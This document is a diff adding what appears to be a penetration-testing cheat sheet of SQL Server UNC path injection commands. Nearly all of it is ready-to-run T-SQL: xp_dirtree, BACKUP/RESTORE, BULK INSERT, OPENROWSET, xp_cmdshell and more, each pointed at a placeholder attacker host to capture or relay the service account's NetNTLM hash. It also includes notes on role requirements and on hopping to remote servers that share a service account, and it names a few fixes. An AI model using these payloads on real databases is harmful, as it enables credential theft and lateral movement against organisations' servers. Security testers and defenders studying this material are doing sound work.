@@ -1,0 +1,221 @@
+This is a list of SQL Server commands that support UNC path [injections] by default.
+The injections can be used to capture or replay the NetNTLM password hash of the
+Windows account used to run the SQL Server service. The SQL Server service account 
+has sysadmin privileges by default in all versions of SQL Server.
+
+Note: This list is most likely not complete.
+
+-----------------------------------------------------------------------
+-- UNC Path Injections Executable by the Public Fixed Server Role 
+-----------------------------------------------------------------------
+-- Note: All are supported by SQL Server 2000 to 2016 (excluding azure)
+
+-- XP_DIRTREE Extended Stored Procedure
+-- Fix: "revoke execute on xp_dirtree to public"
+
+xp_dirtree '\\attackerip\file'
+GO
+
+-- XP_FILEEXIST Extended Stored Procedure
+-- Fix: "revoke execute on xp_fileexist to public"
+
+xp_fileexist '\\attackerip\file'
+GO
+
+-- BACKUP Command
+-- Note: The Public role can't actually execute the backup, but the UNC path is resolved prior to the authorization check.
+-- Fix: https://technet.microsoft.com/library/security/MS16-136, https://technet.microsoft.com/en-us/library/security/mt674627.aspx
+-- Fix note: No patch is available for SQL Server 2000 to 2008, because they are on longer supported. Upgrade if this is you.
+
+BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
+GO
+
+BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
+GO
+
+-- RESTORE Command 
+-- Note: The Public role can't actually execute the RESTORE, but the UNC path is resolved prior to the authorization check.
+-- Fix: https://technet.microsoft.com/library/security/MS16-136, https://technet.microsoft.com/en-us/library/security/mt674627.aspx
+-- Fix note: No patch is available for SQL Server 2000 to 2008, because they are on longer supported. Upgrade if this is you.
+
+RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
+GO
+
+RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
+GO
+
+RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
+GO
+
+RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
+GO
+
+RESTORE LABELONLY FROM DISK = '\\attackerip\file'
+GO
+
+RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
+GO
+
+RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
+GO
+
+------------------------------------------------------
+-- Executable by the Sysadmin fixed server
+-- and with other non Public roles / privileges
+------------------------------------------------------
+-- Note: Almost every function and stored procedure that supports a file path allows UNC paths by design.
+
+-- Create assembly
+CREATE ASSEMBLY HelloWorld FROM '\\attackerip\file' WITH PERMISSION_SET = SAFE;  
+GO
+
+-- Add exteneded stored procedure
+sp_addextendedproc 'xp_hello','\\attackerip\file'
+
+-- Create Certificate
+CREATE CERTIFICATE testing123  
+    FROM EXECUTABLE FILE = '\\attackerip\file';
+GO  
+
+-- Backup Certificate
+BACKUP CERTIFICATE test01 TO FILE = '\\attackerip\file'
+	WITH PRIVATE KEY (decryption by password = 'superpassword',
+	FILE = '\\attackerip\file',
+	encryption by password = 'superpassword');
+go
+
+-- Backup to file - Master Key
+BACKUP MASTER KEY TO FILE = '\\attackerip\file'
+	ENCRYPTION BY PASSWORD = 'password'
+GO
+
+-- Backup to file - Service Master Key
+BACKUP SERVICE MASTER KEY TO FILE = '\\attackerip\file'
+	ENCRYPTION BY PASSWORD = 'password'
+go
+
+-- Restore from file - Master Key
+RESTORE MASTER KEY FROM FILE = '\\attackerip\file'
+	DECRYPTION BY PASSWORD = 'password'
+	ENCRYPTION BY PASSWORD = 'password'
+go
+
+-- Restore from file - Service Master Key
+RESTORE SERVICE MASTER KEY FROM FILE = '\\attackerip\file'
+	DECRYPTION BY PASSWORD = 'password'
+go
+
+-- Read data from file - Bulk insert 1
+CREATE TABLE #TEXTFILE (column1 NVARCHAR(100))
+BULK INSERT #TEXTFILE FROM '\\attackerip\file' 
+DROP TABLE #TEXTFILE
+
+-- Read data from file - Bulk insert 2
+CREATE TABLE #TEXTFILE (column1 NVARCHAR(100))
+BULK INSERT #TEXTFILE FROM '\\attackerip\file' 
+WITH (FORMATFILE = '\\testing21\file')
+DROP TABLE #TEXTFILE
+
+-- Read data from a file - fn_xe_file_target_read_file
+SELECT * FROM sys.fn_xe_file_target_read_file ('\\attackerip\file','\\attackerip\file',null,null)
+GO
+
+-- Read data from a file - fn_get_audit_file
+SELECT * FROM sys.fn_get_audit_file ('\\attackerip\file','\\attackerip\file',default,default);  
+GO  
+
+-- Create Server Audit to File
+CREATE SERVER AUDIT TESTING TO FILE ( FILEPATH = '\\attackerip\file');
+GO
+
+-- Install a cryptographic provider  
+sp_configure 'EKM provider enabled',1
+RECONFIGURE
+GO
+CREATE CRYPTOGRAPHIC PROVIDER SecurityProvider FROM FILE = '\\attackerip\file';  
+GO
+
+-- External file format - Azure only
+CREATE EXTERNAL FILE FORMAT myfileformat WITH (FORMATFILE = '\\testing21\file');
+GO 
+
+-- xp_subdirs
+xp_subdirs '\\attackerip\file'
+
+-- xp_cmdshell 
+xp_cmdshell 'dir \\attackerip\file'
+
+
+-- OpenRowSet 
+General Notes:
+- 2k5 and up
+- You must be a sysadmin. Running the TSQL below with can be used to capture the SQL Server service account password hash.
+- This can also be used to transparently execute commands on remote SQL Servers; IF the servers share a service account and you are running as a sysadmin. This is just exploiting shared service accounts in a new way.
+
+EXEC sp_configure 'show advanced options', 1
+RECONFIGURE
+GO
+EXEC sp_configure 'ad hoc distributed queries', 1
+RECONFIGURE
+GO
+
+-- passthrough sql service auth if your a sysadmin
+DECLARE @sql NVARCHAR(MAX)
+set @sql = 'select a.* from openrowset(''SQLNCLI'', ''Server=evilserver;Trusted_Connection=yes;'', ''select * from master.dbo.sysdatabases'') as a'
+select @sql
+EXEC sp_executeSQL @sql
+
+--Excel 2007-2010 (unc injection)
+-- requires ad-hoc queries to be enabled, but then it can be run by any login
+SELECT * --INTO #productlist
+FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',
+    'Excel 12.0 Xml;HDR=YES;Database=\\server\temp\Products.xlsx',
+    'SELECT * FROM [ProductList$]');
+
+--Excel 97-2003(unc injection)
+-- requires ad-hoc queries to be enabled, but then it can be run by any login
+SELECT * --INTO #productlist
+FROM OPENROWSET('Microsoft.Jet.OLEDB.4.0',
+    'Excel 8.0;HDR=YES;Database=\\server\temp\Products.xls',
+    'select * from [ProductList$]');
+
+Source: https://www.experts-exchange.com/articles/3025/Retrieving-Data-From-Excel-Using-OPENROWSET.html
+
+--old Excel with new ACE driver - working query 1 (unc injection)
+SELECT * --INTO #productlist
+FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',
+    'Excel 8.0;HDR=YES;Database=\\server\temp\Products.xls',
+    'SELECT * FROM [ProductList$]');
+
+--old Excel with new ACE driver - working query 2 (unc injection)
+SELECT * --INTO #productlist
+FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',
+    'Excel 12.0;HDR=YES;Database=\\server\temp\Products.xls',
+    'SELECT * FROM [ProductList$]');
+
+--(unc injection)
+SELECT * --INTO #productlist
+FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',
+    'Excel 12.0 Xml;HDR=YES;Database=\\server\temp\Products.xlsx',
+    'SELECT * FROM [ProductList$]');
+    
+-- requires sysadmin or db_owner role
+SELECT  * FROM fn_dump_dblog(NULL,NULL,'DISK',1
+,'\\attackerip\fakefile.bak'
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
+,NULL,NULL,NULL,NULL,   NULL,NULL,NULL,NULL,NULL,NULL
+,NULL,NULL,NULL,NULL,   NULL,NULL,NULL,NULL,NULL,NULL
+,NULL,NULL,NULL,NULL,   NULL,NULL,NULL,NULL,NULL,NULL
+,NULL,NULL,NULL,NULL,   NULL,NULL,NULL,NULL,NULL,NULL
+,NULL,NULL,NULL,NULL,   NULL,NULL,NULL,NULL,NULL,NULL
+,NULL,NULL,NULL,NULL)
+    
+--OpenDataSource
+-- works on everything since 2k8, requires ad-hoc queries to be enabled, but then it can be run by any login
+- Ref: https://msdn.microsoft.com/en-us/library/ms179856.aspx
+SELECT * FROM OPENDATASOURCE('Microsoft.Jet.OLEDB.4.0','Data Source=\\server1\DataFolder\Documents\TestExcel.xls;Extended Properties=EXCEL 5.0')...[Sheet1$] ; 
+
+-- Web Dav Notes
+xp_dirtree '\\hostname@SSL\test' --ssl 443
+xp_dirtree '\\hostname@SSL@1234\test' --ssl port 1234
+xp_dirtree '\\hostname@1234\test' --http
